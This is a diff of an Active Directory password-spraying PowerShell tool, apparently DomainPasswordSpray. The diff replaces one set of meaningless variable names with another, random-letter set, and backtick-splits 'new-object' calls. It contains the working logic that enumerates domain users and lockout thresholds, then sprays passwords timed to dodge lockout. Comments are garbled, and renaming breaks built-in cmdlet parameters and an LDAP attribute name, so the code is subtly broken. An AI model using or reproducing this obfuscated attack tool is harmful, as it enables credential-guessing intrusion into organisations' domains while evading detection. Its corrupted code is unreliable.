@@ -2,191 +2,191 @@ function Invoke-DomainPasswordSpray{
     param(
      [Parameter(Position = 0, Mandatory = $false)]
      [string]
-     $EarthyPress = "",
+     $RrngBHeYNKlBeRotcyvnw = "",
 
      [Parameter(Position = 1, Mandatory = $false)]
      [string]
-     $MateFire,
+     $yZZWOdVtOiPGRmclTbPHVnBMEd,
 
      [Parameter(Position = 2, Mandatory = $false)]
      [string]
-     $ChaseSqueal,
+     $HjXsGfXTSvsAyjyPyVWNnhoQNaOQUNknCb,
 
      [Parameter(Position = 3, Mandatory = $false)]
      [string]
-     $MeddleExist,
+     $JujBZYfgFHhJKyimboqhYgtDhyFJpVXrRqFaXUVrb,
 
      [Parameter(Position = 4, Mandatory = $false)]
      [string]
-     $StepVoice = "",
+     $zsqJGeyPIapTHdcQMKSTVHNmzpxtyGhcYpJPvDo = "",
 
      [Parameter(Position = 5, Mandatory = $false)]
      [string]
-     $SmokeAbsurd = "",
+     $VUNqJWGTtyPXqKixyjXmCIFL = "",
 
      [Parameter(Position = 6, Mandatory = $false)]
      [switch]
-     $CuddlyMitten,
+     $mDnJIYwLimWCnyFDpmdRyaawzRnO,
 
      [Parameter(Position = 7, Mandatory = $false)]
      [switch]
-     $GrowthFowl,
+     $CzQPaiMVlezHLOsaoSbLGjgOKF,
 
      [Parameter(Position = 8, Mandatory = $false)]
      [int]
-     $WorryTrust=0,
+     $kHjZyYzhuvGYjORGkHNzNgWrfjofwJrDIg=0,
 
      [Parameter(Position = 9, Mandatory = $false)]
-     $SuddenGroan=0,
+     $uDOubCzUPnREBSArGQwMgYfMfHnFmPQyAHDlZ=0,
 
      [Parameter(Position = 10, Mandatory = $false)]
      [switch]
-     $HammerMuscle,
+     $uvVuEMVAxXuSnaLYyrNOCrvPVBYHKTrQZrJqFAbIOQU,
 
      [Parameter(Position = 11, Mandatory = $false)]
      [int]
-     $ListenLiquid=10
+     $zthhsVLpCSlDxjpWvbwWiDwNdKGE=10
     )
 
-    if ($MateFire)
+    if ($yZZWOdVtOiPGRmclTbPHVnBMEd)
     {
-        $PublicFruit = @($MateFire)
+        $rINMlxNbhBrfZrMgVZQcJEtLXsdpJBJjAFsgwcLljM = @($yZZWOdVtOiPGRmclTbPHVnBMEd)
     }
-    elseif($GrowthFowl)
+    elseif($CzQPaiMVlezHLOsaoSbLGjgOKF)
     {
-        $PublicFruit = ""
+        $rINMlxNbhBrfZrMgVZQcJEtLXsdpJBJjAFsgwcLljM = ""
     }
-    elseif($ChaseSqueal)
+    elseif($HjXsGfXTSvsAyjyPyVWNnhoQNaOQUNknCb)
     {
-        $PublicFruit = Get-Content $ChaseSqueal
+        $rINMlxNbhBrfZrMgVZQcJEtLXsdpJBJjAFsgwcLljM = Get-Content $HjXsGfXTSvsAyjyPyVWNnhoQNaOQUNknCb
     }
     else
     {
-        Write-PeckWant -ForegroundColor Red "The -MateFire or -ChaseSqueal option must be specified"
+        Write-sFclwGGLQfDHiMLvoIuVrEfieoWUFfxadmwpQGDJBh -ForegroundColor Red "The -yZZWOdVtOiPGRmclTbPHVnBMEd or -HjXsGfXTSvsAyjyPyVWNnhoQNaOQUNknCb option must be specified"
         break
     }
 
     try
     {
-        if ($SmokeAbsurd -ne "")
+        if ($VUNqJWGTtyPXqKixyjXmCIFL -ne "")
         {
             # Microsoft".
-            $BlotChunky = ne`w`-`ob`je`ct System.DirectoryServices.ActiveDirectory.DirectoryContext("domain",$SmokeAbsurd)
-            $PaleHarbor = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($BlotChunky)
-            $SkinEarthy = "LDAP://" + ([ADSI]"LDAP://$SmokeAbsurd").distinguishedName
+            $RFIoCufzUEecdWkfgEKLGsenOsTlXLsWNvB = ne`w`-ob`je`ct System.DirectoryServices.ActiveDirectory.DirectoryContext("domain",$VUNqJWGTtyPXqKixyjXmCIFL)
+            $YKYoiBMUpUVQcIBhXmWmRxKswp = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($RFIoCufzUEecdWkfgEKLGsenOsTlXLsWNvB)
+            $gTjRcuUzdknrotjviqCbnPR = "LDAP://" + ([ADSI]"LDAP://$VUNqJWGTtyPXqKixyjXmCIFL").distinguishedName
         }
         else
         {
             # Microsoft".
-            $PaleHarbor = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
-            $SkinEarthy = "LDAP://" + ([ADSI]"").distinguishedName
+            $YKYoiBMUpUVQcIBhXmWmRxKswp = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+            $gTjRcuUzdknrotjviqCbnPR = "LDAP://" + ([ADSI]"").distinguishedName
         }
     }
     catch
     {
-        Write-PeckWant -ForegroundColor "red" "[*] Could not connect to the domain. Try specifying the domain name with the -SmokeAbsurd option."
+        Write-sFclwGGLQfDHiMLvoIuVrEfieoWUFfxadmwpQGDJBh -ForegroundColor "red" "[*] Could not connect to the domain. Try specifying the domain name with the -VUNqJWGTtyPXqKixyjXmCIFL option."
         break
     }
 
-    if ($EarthyPress -eq "")
+    if ($RrngBHeYNKlBeRotcyvnw -eq "")
     {
-        $IrateSoak = Get-DomainUserList -SmokeAbsurd $SmokeAbsurd -BoyBall -SawNose -StepVoice $StepVoice
+        $UcAkiafaSVHkFOKDzCtZSccKstsEJSOReXmAzjUP = Get-DomainUserList -VUNqJWGTtyPXqKixyjXmCIFL $VUNqJWGTtyPXqKixyjXmCIFL -ZHezMTeanWONTJTKZKMFHkwsHcMSu -izThjGSxBeDGVIiKsZugyiOPOGCNNReunEP -zsqJGeyPIapTHdcQMKSTVHNmzpxtyGhcYpJPvDo $zsqJGeyPIapTHdcQMKSTVHNmzpxtyGhcYpJPvDo
     }
     else
     {
         # Microsoft".
-        Write-PeckWant "[*] Using $EarthyPress as userlist to spray with"
-        Write-PeckWant -ForegroundColor "yellow" "[*] Warning: Users will not be checked for lockout threshold."
-        $IrateSoak = @()
+        Write-sFclwGGLQfDHiMLvoIuVrEfieoWUFfxadmwpQGDJBh "[*] Using $RrngBHeYNKlBeRotcyvnw as userlist to spray with"
+        Write-sFclwGGLQfDHiMLvoIuVrEfieoWUFfxadmwpQGDJBh -ForegroundColor "yellow" "[*] Warning: Users will not be checked for lockout threshold."
+        $UcAkiafaSVHkFOKDzCtZSccKstsEJSOReXmAzjUP = @()
         try
         {
-            $IrateSoak = Get-Content $EarthyPress -ErrorAction stop
+            $UcAkiafaSVHkFOKDzCtZSccKstsEJSOReXmAzjUP = Get-Content $RrngBHeYNKlBeRotcyvnw -ErrorAction stop
         }
         catch [Exception]
         {
-            Write-PeckWant -ForegroundColor "red" "$_.Exception"
+            Write-sFclwGGLQfDHiMLvoIuVrEfieoWUFfxadmwpQGDJBh -ForegroundColor "red" "$_.Exception"
             break
         }
 
     }
 
 
-    if ($PublicFruit.count -gt 1)
+    if ($rINMlxNbhBrfZrMgVZQcJEtLXsdpJBJjAFsgwcLljM.count -gt 1)
     {
-        Write-PeckWant -ForegroundColor Yellow "[*] WARNING - Be very careful not to lock out accounts with the password list option!"
+        Write-sFclwGGLQfDHiMLvoIuVrEfieoWUFfxadmwpQGDJBh -ForegroundColor Yellow "[*] WARNING - Be very careful not to lock out accounts with the password list option!"
     }
 
-    $WishNest = Get-ObservationWindow $SkinEarthy
+    $wXvoGCngektZSlKgLEgqTLcJQrfgAFvATSBVVbpJOSF = Get-ObservationWindow $gTjRcuUzdknrotjviqCbnPR
 
-    Write-PeckWant -ForegroundColor Yellow "[*] The domain password policy observation window is set to $WishNest minutes."
-    Write-PeckWant "[*] Setting a $WishNest minute wait in between sprays."
+    Write-sFclwGGLQfDHiMLvoIuVrEfieoWUFfxadmwpQGDJBh -ForegroundColor Yellow "[*] The domain password policy observation window is set to $wXvoGCngektZSlKgLEgqTLcJQrfgAFvATSBVVbpJOSF minutes."
+    Write-sFclwGGLQfDHiMLvoIuVrEfieoWUFfxadmwpQGDJBh "[*] Setting a $wXvoGCngektZSlKgLEgqTLcJQrfgAFvATSBVVbpJOSF minute wait in between sprays."
 
     # Microsoft".
-    if (!$CuddlyMitten)
+    if (!$mDnJIYwLimWCnyFDpmdRyaawzRnO)
     {
-        $RabidStuff = "Confirm Password Spray"
-        $TenTour = "Are you sure you want to perform a password spray against " + $IrateSoak.count + " accounts?"
+        $VAYoyIXHmQZfoKkOOozpXts = "Confirm Password Spray"
+        $ugJigYmlqssxIULHayTzJGjbtOowqfchgtsxB = "Are you sure you want to perform a password spray against " + $UcAkiafaSVHkFOKDzCtZSccKstsEJSOReXmAzjUP.count + " accounts?"
 
-        $BlowFall = ne`w`-`ob`je`ct System.Management.Automation.Host.ChoiceDescription "&Yes", `
+        $ntIYbgSsoFFGksqBBHRjfoXnAjDzvFipznvhHk = ne`w`-ob`je`ct System.Management.Automation.Host.ChoiceDescription "&Yes", `
             "Attempts to authenticate 1 time per user in the list for each password in the passwordlist file."
 
-        $CureHeady = ne`w`-`ob`je`ct System.Management.Automation.Host.ChoiceDescription "&No", `
+        $mezoilHxCxpsYmuUqCPwdaejmxyQcgQbUMaa = ne`w`-ob`je`ct System.Management.Automation.Host.ChoiceDescription "&No", `
             "Cancels the password spray."
 
-        $NuttySlimy = [System.Management.Automation.Host.ChoiceDescription[]]($BlowFall, $CureHeady)
+        $XaMpWmwJCGXCMTEClMdi = [System.Management.Automation.Host.ChoiceDescription[]]($ntIYbgSsoFFGksqBBHRjfoXnAjDzvFipznvhHk, $mezoilHxCxpsYmuUqCPwdaejmxyQcgQbUMaa)
 
-        $AcidicMurky = $PeckWant.ui.PromptForChoice($RabidStuff, $TenTour, $NuttySlimy, 0)
+        $otpFCGgGDlKjDAJgIMrEixueNMfesoXvugfyqtw = $sFclwGGLQfDHiMLvoIuVrEfieoWUFfxadmwpQGDJBh.ui.PromptForChoice($VAYoyIXHmQZfoKkOOozpXts, $ugJigYmlqssxIULHayTzJGjbtOowqfchgtsxB, $XaMpWmwJCGXCMTEClMdi, 0)
 
-        if ($AcidicMurky -ne 0)
+        if ($otpFCGgGDlKjDAJgIMrEixueNMfesoXvugfyqtw -ne 0)
         {
-            Write-PeckWant "Cancelling the password spray."
+            Write-sFclwGGLQfDHiMLvoIuVrEfieoWUFfxadmwpQGDJBh "Cancelling the password spray."
             break
         }
     }
-    Write-PeckWant -ForegroundColor Yellow "[*] Password spraying has begun with " $PublicFruit.count " passwords"
-    Write-PeckWant "[*] This might take a while depending on the total number of users"
+    Write-sFclwGGLQfDHiMLvoIuVrEfieoWUFfxadmwpQGDJBh -ForegroundColor Yellow "[*] Password spraying has begun with " $rINMlxNbhBrfZrMgVZQcJEtLXsdpJBJjAFsgwcLljM.count " passwords"
+    Write-sFclwGGLQfDHiMLvoIuVrEfieoWUFfxadmwpQGDJBh "[*] This might take a while depending on the total number of users"
 
-    if($GrowthFowl)
+    if($CzQPaiMVlezHLOsaoSbLGjgOKF)
     {
-        Invoke-SpraySinglePassword -SmokeAbsurd $SkinEarthy -IrateSoak $IrateSoak -MeddleExist $MeddleExist -WorryTrust $WorryTrust -SuddenGroan $SuddenGroan -GrowthFowl -HammerMuscle $HammerMuscle
+        Invoke-SpraySinglePassword -VUNqJWGTtyPXqKixyjXmCIFL $gTjRcuUzdknrotjviqCbnPR -UcAkiafaSVHkFOKDzCtZSccKstsEJSOReXmAzjUP $UcAkiafaSVHkFOKDzCtZSccKstsEJSOReXmAzjUP -JujBZYfgFHhJKyimboqhYgtDhyFJpVXrRqFaXUVrb $JujBZYfgFHhJKyimboqhYgtDhyFJpVXrRqFaXUVrb -kHjZyYzhuvGYjORGkHNzNgWrfjofwJrDIg $kHjZyYzhuvGYjORGkHNzNgWrfjofwJrDIg -uDOubCzUPnREBSArGQwMgYfMfHnFmPQyAHDlZ $uDOubCzUPnREBSArGQwMgYfMfHnFmPQyAHDlZ -CzQPaiMVlezHLOsaoSbLGjgOKF -uvVuEMVAxXuSnaLYyrNOCrvPVBYHKTrQZrJqFAbIOQU $uvVuEMVAxXuSnaLYyrNOCrvPVBYHKTrQZrJqFAbIOQU
     }
     else
     {
-        for($MixVeil = 0; $MixVeil -lt $PublicFruit.count; $MixVeil++)
+        for($tZUHyesMmrudRpxfdQKGpCcYFOjYLwhPvRvcmZ = 0; $tZUHyesMmrudRpxfdQKGpCcYFOjYLwhPvRvcmZ -lt $rINMlxNbhBrfZrMgVZQcJEtLXsdpJBJjAFsgwcLljM.count; $tZUHyesMmrudRpxfdQKGpCcYFOjYLwhPvRvcmZ++)
         {
-            Invoke-SpraySinglePassword -SmokeAbsurd $SkinEarthy -IrateSoak $IrateSoak -MateFire $PublicFruit[$MixVeil] -MeddleExist $MeddleExist -WorryTrust $WorryTrust -SuddenGroan $SuddenGroan -HammerMuscle $HammerMuscle
-            if (($MixVeil+1) -lt $PublicFruit.count)
+            Invoke-SpraySinglePassword -VUNqJWGTtyPXqKixyjXmCIFL $gTjRcuUzdknrotjviqCbnPR -UcAkiafaSVHkFOKDzCtZSccKstsEJSOReXmAzjUP $UcAkiafaSVHkFOKDzCtZSccKstsEJSOReXmAzjUP -yZZWOdVtOiPGRmclTbPHVnBMEd $rINMlxNbhBrfZrMgVZQcJEtLXsdpJBJjAFsgwcLljM[$tZUHyesMmrudRpxfdQKGpCcYFOjYLwhPvRvcmZ] -JujBZYfgFHhJKyimboqhYgtDhyFJpVXrRqFaXUVrb $JujBZYfgFHhJKyimboqhYgtDhyFJpVXrRqFaXUVrb -kHjZyYzhuvGYjORGkHNzNgWrfjofwJrDIg $kHjZyYzhuvGYjORGkHNzNgWrfjofwJrDIg -uDOubCzUPnREBSArGQwMgYfMfHnFmPQyAHDlZ $uDOubCzUPnREBSArGQwMgYfMfHnFmPQyAHDlZ -uvVuEMVAxXuSnaLYyrNOCrvPVBYHKTrQZrJqFAbIOQU $uvVuEMVAxXuSnaLYyrNOCrvPVBYHKTrQZrJqFAbIOQU
+            if (($tZUHyesMmrudRpxfdQKGpCcYFOjYLwhPvRvcmZ+1) -lt $rINMlxNbhBrfZrMgVZQcJEtLXsdpJBJjAFsgwcLljM.count)
             {
-                Countdown-Timer -FuzzyFlight (60*$WishNest + $ListenLiquid) -HammerMuscle $HammerMuscle
+                Countdown-Timer -MKYrXEZuOczNIXEksnpqPeRQDrxx (60*$wXvoGCngektZSlKgLEgqTLcJQrfgAFvATSBVVbpJOSF + $zthhsVLpCSlDxjpWvbwWiDwNdKGE) -uvVuEMVAxXuSnaLYyrNOCrvPVBYHKTrQZrJqFAbIOQU $uvVuEMVAxXuSnaLYyrNOCrvPVBYHKTrQZrJqFAbIOQU
             }
         }
     }
 
-    Write-PeckWant -ForegroundColor Yellow "[*] Password spraying is complete"
-    if ($MeddleExist -ne "")
+    Write-sFclwGGLQfDHiMLvoIuVrEfieoWUFfxadmwpQGDJBh -ForegroundColor Yellow "[*] Password spraying is complete"
+    if ($JujBZYfgFHhJKyimboqhYgtDhyFJpVXrRqFaXUVrb -ne "")
     {
-        Write-PeckWant -ForegroundColor Yellow "[*] Any passwords that were successfully sprayed have been output to $MeddleExist"
+        Write-sFclwGGLQfDHiMLvoIuVrEfieoWUFfxadmwpQGDJBh -ForegroundColor Yellow "[*] Any passwords that were successfully sprayed have been output to $JujBZYfgFHhJKyimboqhYgtDhyFJpVXrRqFaXUVrb"
     }
 }
 
 function Countdown-Timer
 {
     param(
-        $FuzzyFlight = 1800,
-        $TenTour = "[*] Pausing to avoid account lockout.",
-        [switch] $HammerMuscle = $False
+        $MKYrXEZuOczNIXEksnpqPeRQDrxx = 1800,
+        $ugJigYmlqssxIULHayTzJGjbtOowqfchgtsxB = "[*] Pausing to avoid account lockout.",
+        [switch] $uvVuEMVAxXuSnaLYyrNOCrvPVBYHKTrQZrJqFAbIOQU = $False
     )
-    if ($HammerMuscle)
+    if ($uvVuEMVAxXuSnaLYyrNOCrvPVBYHKTrQZrJqFAbIOQU)
     {
-        Write-PeckWant "$TenTour: Waiting for $($FuzzyFlight/60) minutes. $($FuzzyFlight - $IronShaggy)"
-        Start-Sleep -FuzzyFlight $FuzzyFlight
+        Write-sFclwGGLQfDHiMLvoIuVrEfieoWUFfxadmwpQGDJBh "$ugJigYmlqssxIULHayTzJGjbtOowqfchgtsxB: Waiting for $($MKYrXEZuOczNIXEksnpqPeRQDrxx/60) minutes. $($MKYrXEZuOczNIXEksnpqPeRQDrxx - $UzoiTutuPrrkrFRULUMXvg)"
+        Start-Sleep -MKYrXEZuOczNIXEksnpqPeRQDrxx $MKYrXEZuOczNIXEksnpqPeRQDrxx
     } else {
-        foreach ($IronShaggy in (1..$FuzzyFlight))
+        foreach ($UzoiTutuPrrkrFRULUMXvg in (1..$MKYrXEZuOczNIXEksnpqPeRQDrxx))
         {
-            Write-Progress -Id 1 -Activity $TenTour -Status "Waiting for $($FuzzyFlight/60) minutes. $($FuzzyFlight - $IronShaggy) seconds remaining" -PercentComplete (($IronShaggy / $FuzzyFlight) * 100)
-            Start-Sleep -FuzzyFlight 1
+            Write-Progress -Id 1 -Activity $ugJigYmlqssxIULHayTzJGjbtOowqfchgtsxB -Status "Waiting for $($MKYrXEZuOczNIXEksnpqPeRQDrxx/60) minutes. $($MKYrXEZuOczNIXEksnpqPeRQDrxx - $UzoiTutuPrrkrFRULUMXvg) seconds remaining" -PercentComplete (($UzoiTutuPrrkrFRULUMXvg / $MKYrXEZuOczNIXEksnpqPeRQDrxx) * 100)
+            Start-Sleep -MKYrXEZuOczNIXEksnpqPeRQDrxx 1
         }
-        Write-Progress -Id 1 -Activity $TenTour -Status "Completed" -PercentComplete 100 -Completed
+        Write-Progress -Id 1 -Activity $ugJigYmlqssxIULHayTzJGjbtOowqfchgtsxB -Status "Completed" -PercentComplete 100 -Completed
     }
 }
 
@@ -195,250 +195,250 @@ function Get-DomainUserList
     param(
      [Parameter(Position = 0, Mandatory = $false)]
      [string]
-     $SmokeAbsurd = "",
+     $VUNqJWGTtyPXqKixyjXmCIFL = "",
 
      [Parameter(Position = 1, Mandatory = $false)]
      [switch]
-     $BoyBall,
+     $ZHezMTeanWONTJTKZKMFHkwsHcMSu,
 
      [Parameter(Position = 2, Mandatory = $false)]
      [switch]
-     $SawNose,
+     $izThjGSxBeDGVIiKsZugyiOPOGCNNReunEP,
 
      [Parameter(Position = 3, Mandatory = $false)]
      [string]
-     $StepVoice
+     $zsqJGeyPIapTHdcQMKSTVHNmzpxtyGhcYpJPvDo
     )
 
     try
     {
-        if ($SmokeAbsurd -ne "")
+        if ($VUNqJWGTtyPXqKixyjXmCIFL -ne "")
         {
             # Microsoft".
-            $BlotChunky = ne`w`-`ob`je`ct System.DirectoryServices.ActiveDirectory.DirectoryContext("domain",$SmokeAbsurd)
-            $PaleHarbor =[System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($BlotChunky)
-            $SkinEarthy = "LDAP://" + ([ADSI]"LDAP://$SmokeAbsurd").distinguishedName
+            $RFIoCufzUEecdWkfgEKLGsenOsTlXLsWNvB = ne`w`-ob`je`ct System.DirectoryServices.ActiveDirectory.DirectoryContext("domain",$VUNqJWGTtyPXqKixyjXmCIFL)
+            $YKYoiBMUpUVQcIBhXmWmRxKswp =[System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($RFIoCufzUEecdWkfgEKLGsenOsTlXLsWNvB)
+            $gTjRcuUzdknrotjviqCbnPR = "LDAP://" + ([ADSI]"LDAP://$VUNqJWGTtyPXqKixyjXmCIFL").distinguishedName
         }
         else
         {
             # Microsoft".
-            $PaleHarbor =[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
-            $SkinEarthy = "LDAP://" + ([ADSI]"").distinguishedName
+            $YKYoiBMUpUVQcIBhXmWmRxKswp =[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+            $gTjRcuUzdknrotjviqCbnPR = "LDAP://" + ([ADSI]"").distinguishedName
         }
     }
     catch
     {
-        Write-PeckWant -ForegroundColor "red" "[*] Could connect to the domain. Try specifying the domain name with the -SmokeAbsurd option."
+        Write-sFclwGGLQfDHiMLvoIuVrEfieoWUFfxadmwpQGDJBh -ForegroundColor "red" "[*] Could connect to the domain. Try specifying the domain name with the -VUNqJWGTtyPXqKixyjXmCIFL option."
         break
     }
 
     # Microsoft".
-    $CalmPotato = [ADSI] "LDAP://$($PaleHarbor.PDCRoleOwner)"
-    $PreachGhost = @()
-    $PreachGhost += $CalmPotato.Properties.lockoutthreshold
+    $MEfxDQMXheWBjXfeWDccxh = [ADSI] "LDAP://$($YKYoiBMUpUVQcIBhXmWmRxKswp.PDCRoleOwner)"
+    $kYHTdtRQTpJSdwArlXVUvLpyhTRNhRKi = @()
+    $kYHTdtRQTpJSdwArlXVUvLpyhTRNhRKi += $MEfxDQMXheWBjXfeWDccxh.Properties.lockoutthreshold
 
     # Microsoft".
-    $ThronePowder = [int] $CalmPotato.Properties['msds-behavior-version'].item(0)
-    if ($ThronePowder -ge 3)
+    $GKdwYHfTXDNjSrvrMkfJAxpKSuQtmkABDRLjBgTv = [int] $MEfxDQMXheWBjXfeWDccxh.Properties['msds-behavior-version'].item(0)
+    if ($GKdwYHfTXDNjSrvrMkfJAxpKSuQtmkABDRLjBgTv -ge 3)
     {
         # Microsoft".
-        Write-PeckWant "[*] Current domain is compatible with Fine-Grained Password Policy."
-        $GrayComb = ne`w`-`ob`je`ct System.DirectoryServices.DirectorySearcher
-        $GrayComb.SearchRoot = $CalmPotato
-        $GrayComb.Filter = "(objectclass=msDS-PasswordSettings)"
-        $KnottySink = $GrayComb.FindAll()
+        Write-sFclwGGLQfDHiMLvoIuVrEfieoWUFfxadmwpQGDJBh "[*] Current domain is compatible with Fine-Grained Password Policy."
+        $YlzWDNrHPtvrqZhtuhzWoCKqgWcnDtsTRu = ne`w`-ob`je`ct System.DirectoryServices.DirectorySearcher
+        $YlzWDNrHPtvrqZhtuhzWoCKqgWcnDtsTRu.SearchRoot = $MEfxDQMXheWBjXfeWDccxh
+        $YlzWDNrHPtvrqZhtuhzWoCKqgWcnDtsTRu.Filter = "(objectclass=msDS-PasswordSettings)"
+        $cXtWErHvcpSDbeqqeFHENyj = $YlzWDNrHPtvrqZhtuhzWoCKqgWcnDtsTRu.FindAll()
 
-        if ( $KnottySink.count -gt 0)
+        if ( $cXtWErHvcpSDbeqqeFHENyj.count -gt 0)
         {
-            Write-PeckWant -foregroundcolor "yellow" ("[*] A total of " + $KnottySink.count + " Fine-Grained Password policies were found.`r`n")
-            foreach($JuggleLip in $KnottySink)
+            Write-sFclwGGLQfDHiMLvoIuVrEfieoWUFfxadmwpQGDJBh -foregroundcolor "yellow" ("[*] A total of " + $cXtWErHvcpSDbeqqeFHENyj.count + " Fine-Grained Password policies were found.`r`n")
+            foreach($ETHGVqpCGRLXpOgGsyQKJCdyvNtPodBGCQxKAinI in $cXtWErHvcpSDbeqqeFHENyj)
             {
                 # Microsoft".
                 # Microsoft".
-                $FearPlant = $JuggleLip | Select-Object -ExpandProperty Properties
-                $TrailSack = $FearPlant.name
-                $BawdyIcky = $FearPlant.'msds-lockoutthreshold'
-                $PlaneProud = $FearPlant.'msds-PlaneProud'
-                $StormyExtend = $FearPlant.'msds-minimumpasswordlength'
+                $iAkmCXyiqPVudHqhrmgWYfSzVvFHWvfBoqZ = $ETHGVqpCGRLXpOgGsyQKJCdyvNtPodBGCQxKAinI | Select-Object -ExpandProperty Properties
+                $IlVSakNEsvJcJAVZCxIc = $iAkmCXyiqPVudHqhrmgWYfSzVvFHWvfBoqZ.name
+                $ETTMYrheYqKKAAdLBMtAvWspROnNIdFOszUCBpyz = $iAkmCXyiqPVudHqhrmgWYfSzVvFHWvfBoqZ.'msds-lockoutthreshold'
+                $KFnGuVrXWSlAKIxIOSWqLRrZjtNHHg = $iAkmCXyiqPVudHqhrmgWYfSzVvFHWvfBoqZ.'msds-KFnGuVrXWSlAKIxIOSWqLRrZjtNHHg'
+                $LLFsUMGHvqKKJINwZHPAwAcKiseAZIT = $iAkmCXyiqPVudHqhrmgWYfSzVvFHWvfBoqZ.'msds-minimumpasswordlength'
                 # Microsoft".
-                $PreachGhost += $BawdyIcky
+                $kYHTdtRQTpJSdwArlXVUvLpyhTRNhRKi += $ETTMYrheYqKKAAdLBMtAvWspROnNIdFOszUCBpyz
 
-                Write-PeckWant "[*] Fine-Grained Password Policy titled: $TrailSack has a Lockout Threshold of $BawdyIcky attempts, minimum password length of $StormyExtend chars, and applies to $PlaneProud.`r`n"
+                Write-sFclwGGLQfDHiMLvoIuVrEfieoWUFfxadmwpQGDJBh "[*] Fine-Grained Password Policy titled: $IlVSakNEsvJcJAVZCxIc has a Lockout Threshold of $ETTMYrheYqKKAAdLBMtAvWspROnNIdFOszUCBpyz attempts, minimum password length of $LLFsUMGHvqKKJINwZHPAwAcKiseAZIT chars, and applies to $KFnGuVrXWSlAKIxIOSWqLRrZjtNHHg.`r`n"
             }
         }
     }
 
-    $WishNest = Get-ObservationWindow $SkinEarthy
+    $wXvoGCngektZSlKgLEgqTLcJQrfgAFvATSBVVbpJOSF = Get-ObservationWindow $gTjRcuUzdknrotjviqCbnPR
 
     # Microsoft".
     # Microsoft".
     # Microsoft".
-    [int]$CoachWait = $PreachGhost | sort | Select -First 1
-    Write-PeckWant -ForegroundColor "yellow" "[*] Now creating a list of users to spray..."
+    [int]$ucpOLyHmtPTkuRlQRTXbSvp = $kYHTdtRQTpJSdwArlXVUvLpyhTRNhRKi | sort | Select -First 1
+    Write-sFclwGGLQfDHiMLvoIuVrEfieoWUFfxadmwpQGDJBh -ForegroundColor "yellow" "[*] Now creating a list of users to spray..."
 
-    if ($CoachWait -eq "0")
+    if ($ucpOLyHmtPTkuRlQRTXbSvp -eq "0")
     {
-        Write-PeckWant -ForegroundColor "Yellow" "[*] There appears to be no lockout policy."
+        Write-sFclwGGLQfDHiMLvoIuVrEfieoWUFfxadmwpQGDJBh -ForegroundColor "Yellow" "[*] There appears to be no lockout policy."
     }
     else
     {
-        Write-PeckWant -ForegroundColor "Yellow" "[*] The smallest lockout threshold discovered in the domain is $CoachWait login attempts."
+        Write-sFclwGGLQfDHiMLvoIuVrEfieoWUFfxadmwpQGDJBh -ForegroundColor "Yellow" "[*] The smallest lockout threshold discovered in the domain is $ucpOLyHmtPTkuRlQRTXbSvp login attempts."
     }
 
-    $HatTouch = ne`w`-`ob`je`ct System.DirectoryServices.DirectorySearcher([ADSI]$SkinEarthy)
-    $DonkeyFour = ne`w`-`ob`je`ct System.DirectoryServices.DirectoryEntry
-    $HatTouch.SearchRoot = $DonkeyFour
+    $QTqfzDjRPWjWfTvaipcqYYxAbTMP = ne`w`-ob`je`ct System.DirectoryServices.DirectorySearcher([ADSI]$gTjRcuUzdknrotjviqCbnPR)
+    $QtMRcWERueAptznPUfexKhGbD = ne`w`-ob`je`ct System.DirectoryServices.DirectoryEntry
+    $QTqfzDjRPWjWfTvaipcqYYxAbTMP.SearchRoot = $QtMRcWERueAptznPUfexKhGbD
 
-    $HatTouch.PropertiesToLoad.Add("samaccountname") > $Null
-    $HatTouch.PropertiesToLoad.Add("badpwdcount") > $Null
-    $HatTouch.PropertiesToLoad.Add("badpasswordtime") > $Null
+    $QTqfzDjRPWjWfTvaipcqYYxAbTMP.PropertiesToLoad.Add("samaccountname") > $Null
+    $QTqfzDjRPWjWfTvaipcqYYxAbTMP.PropertiesToLoad.Add("badpwdcount") > $Null
+    $QTqfzDjRPWjWfTvaipcqYYxAbTMP.PropertiesToLoad.Add("badpasswordtime") > $Null
 
-    if ($BoyBall)
+    if ($ZHezMTeanWONTJTKZKMFHkwsHcMSu)
     {
-        Write-PeckWant -ForegroundColor "yellow" "[*] Removing disabled users from list."
+        Write-sFclwGGLQfDHiMLvoIuVrEfieoWUFfxadmwpQGDJBh -ForegroundColor "yellow" "[*] Removing disabled users from list."
         # Microsoft".
         # Microsoft".
         # Microsoft".
         # Microsoft".
         # Microsoft".
-        $HatTouch.filter =
-            "(&(objectCategory=person)(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=16)(!userAccountControl:1.2.840.113556.1.4.803:=2)$StepVoice)"
+        $QTqfzDjRPWjWfTvaipcqYYxAbTMP.filter =
+            "(&(objectCategory=person)(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=16)(!userAccountControl:1.2.840.113556.1.4.803:=2)$zsqJGeyPIapTHdcQMKSTVHNmzpxtyGhcYpJPvDo)"
     }
     else
     {
-        $HatTouch.filter = "(&(objectCategory=person)(objectClass=user)$StepVoice)"
+        $QTqfzDjRPWjWfTvaipcqYYxAbTMP.filter = "(&(objectCategory=person)(objectClass=user)$zsqJGeyPIapTHdcQMKSTVHNmzpxtyGhcYpJPvDo)"
     }
 
-    $HatTouch.PropertiesToLoad.add("samaccountname") > $Null
-    $HatTouch.PropertiesToLoad.add("lockouttime") > $Null
-    $HatTouch.PropertiesToLoad.add("badpwdcount") > $Null
-    $HatTouch.PropertiesToLoad.add("badpasswordtime") > $Null
+    $QTqfzDjRPWjWfTvaipcqYYxAbTMP.PropertiesToLoad.add("samaccountname") > $Null
+    $QTqfzDjRPWjWfTvaipcqYYxAbTMP.PropertiesToLoad.add("lockouttime") > $Null
+    $QTqfzDjRPWjWfTvaipcqYYxAbTMP.PropertiesToLoad.add("badpwdcount") > $Null
+    $QTqfzDjRPWjWfTvaipcqYYxAbTMP.PropertiesToLoad.add("badpasswordtime") > $Null
 
     # Microsoft".
 
     # Microsoft".
-    $HatTouch.PageSize = 1000
-    $CooingMiddle = $HatTouch.FindAll()
-    Write-PeckWant -ForegroundColor "yellow" ("[*] There are " + $CooingMiddle.count + " total users found.")
-    $IrateSoak = @()
+    $QTqfzDjRPWjWfTvaipcqYYxAbTMP.PageSize = 1000
